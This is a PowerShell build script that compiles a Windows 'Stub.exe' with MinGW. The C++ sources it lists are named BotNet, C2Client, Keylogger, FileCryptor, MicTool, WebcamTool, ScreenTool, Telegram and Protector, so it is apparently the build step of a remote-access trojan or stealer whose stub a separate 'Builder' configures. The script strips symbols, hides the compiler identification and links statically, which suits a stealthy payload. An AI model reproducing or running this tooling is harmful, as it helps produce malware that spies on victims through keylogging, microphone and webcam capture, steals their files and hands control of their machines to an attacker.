# Build Stub.exe with MinGW
# Run from anywhere — script locates itself

$StubDir     = $PSScriptRoot
$CryptoPP    = 'D:\CryptoPP'
$NlohmannInc = "$StubDir\..\packages\nlohmann.json.3.9.1\build\native\include"

Set-Location $StubDir

$Sources = 'BotNet.cpp','C2Client.cpp','FileCryptor.cpp','FileManager.cpp',
           'Information.cpp','Keylogger.cpp','Manager.cpp','MicTool.cpp',
           'PrntSc.cpp','ProcessManager.cpp','Protector.cpp','Requests.cpp',
           'ScreenTool.cpp','ServiceManager.cpp','Telegram.cpp','Telemetry.cpp',
           'WebcamTool.cpp','WinMain.cpp'

# Step 1: compile resource file
Write-Host '[1/3] Compiling resource file...'
windres Stub.rc -o Stub_res.o
if ($LASTEXITCODE -ne 0) { Write-Host 'windres failed'; exit 1 }

# Step 2: compile + link in one g++ call
Write-Host '[2/3] Compiling and linking...'
$args = $Sources + 'Stub_res.o' + @(
    '-std=c++17', '-O2', '-mwindows',
    '-s',                       # strip all symbols from binary
    '-fno-ident',               # suppress GCC version string in .comment section
    '-fno-threadsafe-statics',  # no pthread guards for C++ static-local init
    '-ffunction-sections', '-fdata-sections',  # allow linker to remove dead code
    '-Wl,--gc-sections',        # remove unused sections
    '-static-libgcc',           # embed libgcc — removes libgcc_s_seh-1.dll dependency
    '-static-libstdc++',        # embed libstdc++ — removes libstdc++-6.dll dependency
    "-I$CryptoPP",
    "-I$NlohmannInc",
    "-L$CryptoPP",
    '-lcryptopp', '-lwininet', '-lgdiplus', '-lurlmon',
    '-lpsapi', '-lvfw32', '-lwinmm', '-lws2_32', '-lole32',
    '-lshlwapi', '-ladvapi32', '-luser32', '-lgdi32', '-lshell32',
    '-liphlpapi',
    # --whole-archive forces the linker to include all objects from libwinpthread.a
    # before falling back to the DLL import library, eliminating libwinpthread-1.dll.
    '-Wl,--whole-archive', 'C:/MinGW/x86_64-w64-mingw32/lib/libwinpthread.a', '-Wl,--no-whole-archive',
    '-o', 'Stub.exe'
)

& g++ @args

if ($LASTEXITCODE -ne 0) {
    Remove-Item -ErrorAction SilentlyContinue Stub_res.o
    Write-Host 'Build FAILED' -ForegroundColor Red
    exit 1
}

Remove-Item -ErrorAction SilentlyContinue Stub_res.o
Write-Host '[3/3] Done — Stub.exe ready.' -ForegroundColor Green
Write-Host 'Next: Builder reads Stub.exe from this folder — run the Builder and configure it.'
